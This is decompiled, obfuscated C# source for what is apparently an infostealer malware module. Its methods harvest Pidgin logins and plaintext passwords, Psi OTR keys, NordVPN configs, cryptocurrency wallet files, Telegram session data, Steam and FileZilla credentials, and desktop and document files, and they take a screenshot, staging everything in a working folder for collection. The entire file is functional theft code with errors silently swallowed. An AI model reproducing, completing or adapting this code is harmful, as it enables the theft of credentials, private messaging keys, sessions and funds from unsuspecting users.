using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;
using System.Xml;
using Microsoft.Win32;
using who;

// Token: 0x0200003B RID: 59
internal class Class22
{
	// Token: 0x060001DD RID: 477 RVA: 0x0000EC48 File Offset: 0x0000CE48
	public static void smethod_0()
	{
		string text = Path.Combine(Dirs.AppData, ".purple\\logs\\jabber");
		if (Directory.Exists(text))
		{
			Directory.CreateDirectory(Dirs.WorkDir + "\\Pidgin\\Logs");
			Class22.smethod_1(text, Dirs.WorkDir + "\\Pidgin\\Logs");
		}
	}

	// Token: 0x060001DE RID: 478 RVA: 0x0000EC98 File Offset: 0x0000CE98
	public static void smethod_1(string string_0, string string_1)
	{
		DirectoryInfo directoryInfo_ = new DirectoryInfo(string_0);
		DirectoryInfo directoryInfo_2 = new DirectoryInfo(string_1);
		Class22.smethod_2(directoryInfo_, directoryInfo_2);
	}

	// Token: 0x060001DF RID: 479 RVA: 0x0000ECBC File Offset: 0x0000CEBC
	public static void smethod_2(DirectoryInfo directoryInfo_0, DirectoryInfo directoryInfo_1)
	{
		try
		{
			foreach (FileInfo fileInfo in directoryInfo_0.GetFiles())
			{
				fileInfo.CopyTo(Path.Combine(directoryInfo_1.ToString(), fileInfo.Name), true);
			}
			foreach (DirectoryInfo directoryInfo in directoryInfo_0.GetDirectories())
			{
				DirectoryInfo directoryInfo_2 = directoryInfo_1.CreateSubdirectory(directoryInfo.Name);
				Class22.smethod_2(directoryInfo, directoryInfo_2);
			}
		}
		catch
		{
		}
	}

	// Token: 0x060001E0 RID: 480 RVA: 0x0000ED48 File Offset: 0x0000CF48
	public static void smethod_3()
	{
		string path = Dirs.AppData + "\\Psi\\profiles\\default\\";
		try
		{
			if (Directory.Exists(path))
			{
				Directory.CreateDirectory(Dirs.WorkDir + "\\Psi");
				string[] files = Directory.GetFiles(path);
				foreach (string text in files)
				{
					try
					{
						FileInfo fileInfo = new FileInfo(text);
						if (fileInfo.Name == "accounts.xml")
						{
							File.Copy(text, Dirs.WorkDir + "\\Psi\\accounts.xml");
						}
						if (fileInfo.Name == "otr.keys")
						{
							File.Copy(text, Dirs.WorkDir + "\\Psi\\otr.keys");
						}
						if (fileInfo.Name == "otr.fingerprints")
						{
							File.Copy(text, Dirs.WorkDir + "\\Psi\\otr.fingerpits");
						}
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
	}

	// Token: 0x060001E1 RID: 481 RVA: 0x0000EE54 File Offset: 0x0000D054
	public static void smethod_4()
	{
		try
		{
			if (Directory.Exists(Dirs.AppData + "\\NordVPN"))
			{
				string[] directories = Directory.GetDirectories(Dirs.AppData + "\\NordVPN");
				Directory.CreateDirectory(Dirs.WorkDir + "\\NordVPN");
				foreach (string text in directories)
				{
					if (text.StartsWith(Dirs.AppData + "\\NordVPN\\NordVPN.exe"))
					{
						string name = new DirectoryInfo(text).Name;
						string[] directories2 = Directory.GetDirectories(text);
						Directory.CreateDirectory(string.Concat(new string[]
						{
							Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
							"\\Windows\\Vpn\\NordVPN\\",
							name,
							"\\",
							new DirectoryInfo(directories2[0]).Name
						}));
						File.Copy(directories2[0] + "\\user.config", string.Concat(new string[]
						{
							Dirs.WorkDir,
							"\\NordVPN",
							name,
							"\\",
							new DirectoryInfo(directories2[0]).Name,
							"\\user.config"
						}));
					}
				}
			}
		}
		catch
		{
		}
	}

	// Token: 0x060001E2 RID: 482 RVA: 0x0000EFA4 File Offset: 0x0000D1A4
	public static void smethod_5(string string_0)
	{
		try
		{
			string[] directories = Directory.GetDirectories(string_0);
			int i = 0;
			while (i < directories.Length)
			{
				string text = directories[i];
				try
				{
					if (text == Dirs.AppData + "\\Microsoft")
					{
						goto IL_1F8;
					}
					if (text == Dirs.LocalAppData + "\\Application Data")
					{
						goto IL_1F8;
					}
					if (text == Dirs.LocalAppData + "\\History")
					{
						goto IL_1F8;
					}
					if (text == Dirs.LocalAppData + "\\Microsoft")
					{
						goto IL_1F8;
					}
					if (text == Dirs.LocalAppData + "\\Temporary Internet Files")
					{
						goto IL_1F8;
					}
					string[] files = Directory.GetFiles(text);
					foreach (string text2 in files)
					{
						FileInfo fileInfo = new FileInfo(text2);
						if (fileInfo.Name == "wallet.dat" || fileInfo.Name == "wallet" || fileInfo.Name == "default_wallet.dat" || fileInfo.Name == "default_wallet" || fileInfo.Name.EndsWith("wallet") || fileInfo.Name.EndsWith("bit") || fileInfo.Name.StartsWith("wallet"))
						{
							Directory.CreateDirectory(Dirs.WorkDir + "\\Wallets");
							try
							{
								if (!fileInfo.Name.EndsWith(".log"))
								{
									string name = new DirectoryInfo(text).Name;
									Directory.CreateDirectory(Dirs.WorkDir + "\\Wallets\\" + name);
									File.Copy(text2, string.Concat(new string[]
									{
										Dirs.WorkDir,
										"\\Wallets\\",
										name,
										"\\",
										fileInfo.Name
									}));
								}
							}
							catch
							{
							}
						}
					}
				}
				catch
				{
				}
				goto IL_1F2;
				IL_1F8:
				i++;
				continue;
				IL_1F2:
				Class22.smethod_5(text);
				goto IL_1F8;
			}
		}
		catch
		{
		}
	}

	// Token: 0x060001E3 RID: 483 RVA: 0x0000F204 File Offset: 0x0000D404
	public static void smethod_6()
	{
		string[] array = new string[]
		{
			"\\D877F783D5D3EF8C1",
			"\\D877F783D5D3EF8C0",
			"\\D877F783D5D3EF8C\\map1",
			"\\D877F783D5D3EF8C\\map0"
		};
		try
		{
			if (Process.GetProcessesByName("Telegram").Length != 0)
			{
				Process process = Process.GetProcessesByName("Telegram")[0];
				ProcessModuleCollection modules = process.Modules;
				using (IEnumerator enumerator = modules.GetEnumerator())
				{
					while (enumerator.MoveNext())
					{
						ProcessModule processModule = (ProcessModule)enumerator.Current;
						string fileName = processModule.FileName;
						string text = fileName.Remove(fileName.LastIndexOf('\\') + 1).Replace('"', ' ') + "tdata";
						if (Directory.Exists(text))
						{
							Directory.CreateDirectory(Dirs.WorkDir + "\\Telegram");
						}
						if (!Directory.Exists(Dirs.WorkDir + "\\Telegram\\D877F783D5D3EF8C"))
						{
							Directory.CreateDirectory(Dirs.WorkDir + "\\Telegram\\D877F783D5D3EF8C");
						}
						foreach (string text2 in array)
						{
							try
							{
								File.Copy(text + text2, Dirs.WorkDir + "\\Telegram" + text2, true);
							}
							catch
							{
							}
						}
					}
					goto IL_224;
				}
			}
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Classes\\tdesktop.tg\\DefaultIcon");
			string text3 = (string)registryKey.GetValue(null);
			registryKey.Close();
			string text4 = text3.Remove(text3.LastIndexOf('\\') + 1).Replace('"', ' ') + "tdata";
			if (Directory.Exists(text4))
			{
				Directory.CreateDirectory(Dirs.WorkDir + "\\Telegram");
			}
			if (!Directory.Exists(Dirs.WorkDir + "\\Telegram\\D877F783D5D3EF8C"))
			{
				Directory.CreateDirectory(Dirs.WorkDir + "\\Telegram\\D877F783D5D3EF8C");
			}
			foreach (string text5 in array)
			{
				try
				{
					File.Copy(text4 + text5, Dirs.WorkDir + "\\Telegram" + text5, true);
				}
				catch
				{
				}
			}
			IL_224:;
		}
		catch
		{
		}
	}

	// Token: 0x060001E4 RID: 484 RVA: 0x0000F4A0 File Offset: 0x0000D6A0
	public static void Pidgin()
	{
		StringBuilder stringBuilder = new StringBuilder();
		string text = Path.Combine(Dirs.AppData, ".purple\\accounts.xml");
		if (File.Exists(text))
		{
			try
			{
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.Load(new XmlTextReader(text));
				foreach (object obj in xmlDocument.DocumentElement.ChildNodes)
				{
					XmlNode xmlNode = (XmlNode)obj;
					string innerText = xmlNode.ChildNodes[0].InnerText;
					string innerText2 = xmlNode.ChildNodes[1].InnerText;
					string innerText3 = xmlNode.ChildNodes[2].InnerText;
					if (string.IsNullOrEmpty(innerText) || string.IsNullOrEmpty(innerText2) || string.IsNullOrEmpty(innerText3))
					{
						break;
					}
					stringBuilder.AppendLine("Protocol: " + innerText);
					stringBuilder.AppendLine("Login: " + innerText2);
					stringBuilder.AppendLine("Password: " + innerText3 + "\r\n");
				}
				if (stringBuilder.Length > 0)
				{
					Directory.CreateDirectory(Dirs.WorkDir + "\\Pidgin");
					try
					{
						File.AppendAllText(Dirs.WorkDir + "\\Pidgin\\Logins.txt", stringBuilder.ToString());
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			Class22.smethod_0();
		}
	}

	// Token: 0x060001E5 RID: 485 RVA: 0x0000F658 File Offset: 0x0000D858
	public static void smethod_7()
	{
		Directory.CreateDirectory(Dirs.WorkDir + "\\Desktop");
		Directory.CreateDirectory(Dirs.WorkDir + "\\Documents");
		DirectoryInfo directoryInfo = new DirectoryInfo(Dirs.Documents);
		DirectoryInfo directoryInfo2 = new DirectoryInfo(Dirs.Desktop);
		try
		{
			foreach (FileInfo fileInfo in directoryInfo2.GetFiles())
			{
				foreach (string value in Class22.list_0)
				{
					if (fileInfo.Extension.Equals(value) && fileInfo.Length <= (long)Class22.int_0)
					{
						fileInfo.CopyTo(Dirs.WorkDir + "\\Desktop\\" + fileInfo.Name);
					}
				}
			}
		}
		catch
		{
		}
		foreach (DirectoryInfo directoryInfo3 in directoryInfo2.GetDirectories())
		{
			foreach (FileInfo fileInfo2 in directoryInfo3.GetFiles())
			{
				foreach (string value2 in Class22.list_0)
				{
					if (fileInfo2.Extension.Equals(value2) && fileInfo2.Length <= (long)Class22.int_0)
					{
						try
						{
							if (!Directory.Exists(string.Format("{0}\\Desktop\\{1}", Dirs.WorkDir, directoryInfo3)))
							{
								Directory.CreateDirectory(string.Format("{0}\\Desktop\\{1}", Dirs.WorkDir, directoryInfo3));
							}
							fileInfo2.CopyTo(string.Format("{0}\\Desktop\\{1}\\{2}", Dirs.WorkDir, directoryInfo3, fileInfo2));
						}
						catch
						{
						}
					}
				}
			}
		}
		try
		{
			foreach (FileInfo fileInfo3 in directoryInfo.GetFiles())
			{
				foreach (string value3 in Class22.list_0)
				{
					if (fileInfo3.Extension.Equals(value3) && fileInfo3.Length <= (long)Class22.int_0)
					{
						fileInfo3.CopyTo(Dirs.WorkDir + "\\Documents\\" + fileInfo3.Name);
					}
				}
			}
		}
		catch
		{
		}
	}

	// Token: 0x060001E6 RID: 486 RVA: 0x0000F930 File Offset: 0x0000DB30
	public static void smethod_8()
	{
		int width = int.Parse(Screen.PrimaryScreen.Bounds.Width.ToString());
		int height = int.Parse(Screen.PrimaryScreen.Bounds.Width.ToString());
		Bitmap bitmap = new Bitmap(width, height);
		Size blockRegionSize = new Size(bitmap.Width, bitmap.Height);
		Graphics graphics = Graphics.FromImage(bitmap);
		graphics.CopyFromScreen(0, 0, 0, 0, blockRegionSize);
		string filename = Dirs.WorkDir + "\\screenshot.jpg";
		bitmap.Save(filename);
	}

	// Token: 0x060001E7 RID: 487 RVA: 0x0000F9CC File Offset: 0x0000DBCC
	public static void Steam()
	{
		string[] array = new string[]
		{
			"config.vdf",
			"loginusers.vdf",
			"DialogConfig.vdf"
		};
		if (Directory.Exists(Dirs.Steam))
		{
			Dirs.LogPC.Add("[✅] Steam");
			Directory.CreateDirectory(Dirs.SteamDir);
			Directory.CreateDirectory(Dirs.SteamDir + "\\config");
			foreach (string str in array)
			{
				try
				{
					File.Copy(Dirs.Config + "\\" + str, Dirs.SteamDir + "\\config\\" + str);
				}
				catch
				{
				}
			}
			DirectoryInfo directoryInfo = new DirectoryInfo(Dirs.Steam);
			foreach (FileInfo fileInfo in directoryInfo.GetFiles("ssfn*"))
			{
				File.Copy(fileInfo.FullName, Dirs.SteamDir + "\\" + fileInfo.Name, true);
			}
		}
	}

	// Token: 0x060001E8 RID: 488 RVA: 0x0000FADC File Offset: 0x0000DCDC
	public static void FileZilla()
	{
		if (Directory.Exists(Dirs.FileZilla))
		{
			Dirs.LogPC.Add("[✅] FileZilla");
			string[] array = new string[]
			{
				"recentservers.xml",
				"sitemanager.xml"
			};
			if (!Directory.Exists(Dirs.WorkDir + "\\FileZilla"))
			{
				Directory.CreateDirectory(Dirs.WorkDir + "\\FileZilla");
			}
			foreach (string str in array)
			{
				try
				{
					File.Copy(Dirs.FileZilla + "\\" + str, Dirs.WorkDir + "\\FileZilla\\" + str);
				}
				catch
				{
				}
			}
		}
	}

	// Token: 0x060001E9 RID: 489 RVA: 0x0000276F File Offset: 0x0000096F
	public Class22()
	{
		Class34.A1SfXVPz7w9eh();
		base..ctor();
	}

	// Token: 0x060001EA RID: 490 RVA: 0x00002DAB File Offset: 0x00000FAB
	// Note: this type is marked as 'beforefieldinit'.
	static Class22()
	{
		Class34.A1SfXVPz7w9eh();
		Class22.list_0 = new List<string>();
	}

	// Token: 0x040000D1 RID: 209
	public static int int_0;

	// Token: 0x040000D2 RID: 210
	public static List<string> list_0;
}
